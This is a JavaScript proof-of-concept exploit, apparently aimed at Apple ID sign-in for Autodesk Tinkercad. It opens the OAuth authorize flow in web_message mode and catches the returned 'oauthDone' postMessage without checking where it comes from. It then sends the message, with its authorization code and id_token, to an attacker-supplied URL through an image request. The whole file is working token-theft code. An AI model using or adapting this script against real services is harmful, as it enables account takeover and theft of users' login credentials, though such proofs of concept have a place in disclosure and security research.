// Step 1: Display a message
document.write("<h5>Click anywhere on the screen</h5>");

// Step 2: Extract values from the URL hash parameters
const urlHash = new URLSearchParams(window.location.hash.substring(1));
const state = urlHash.get('state'); // Extract 'state' from hash
const targetUrl = urlHash.get('url'); // Extract 'url' from hash

if (!state || !targetUrl) {
    console.error("Missing 'state' or 'url' in the hash parameters.");
    throw new Error("Required parameters are not present.");
}

// Step 3: Add click event listener
document.addEventListener('click', () => {
    const oauthUrl = `https://appleid.apple.com/auth/authorize?client_id=service.com.autodesk.tinkercad&redirect_uri=https%3A%2F%2Faccounts.autodesk.com%2Fsocial%2Fcallback&response_type=code%20id_token&state=${state}&scope=openid%20email%20name&response_mode=web_message&frame_id=0f1e265e-2f2a-4210-9aa5-53615534ff95&m=12&v=1.5.5`;
    window.open(oauthUrl, '_blank'); // Open the URL in a new tab/window
});

// Step 4: Listen to postMessage
window.addEventListener('message', (event) => {
    try {
        const messageData = typeof event.data === 'string' ? JSON.parse(event.data) : event.data;

        // Check if the message starts with the required structure
        if (messageData.method === 'oauthDone') {
            // Serialize the message data into GET parameters
            const queryParams = new URLSearchParams({
                method: messageData.method,
                data: JSON.stringify(messageData) // Convert object to a JSON string
            }).toString();

            const imgUrl = `${targetUrl}?${queryParams}`;

            // Dynamically create and load an image
            const img = new Image();
            img.src = imgUrl;

            // Optionally append the image to the body
            document.body.appendChild(img);
        }
    } catch (error) {
        console.error('Error parsing or handling the postMessage:', error);
    }
});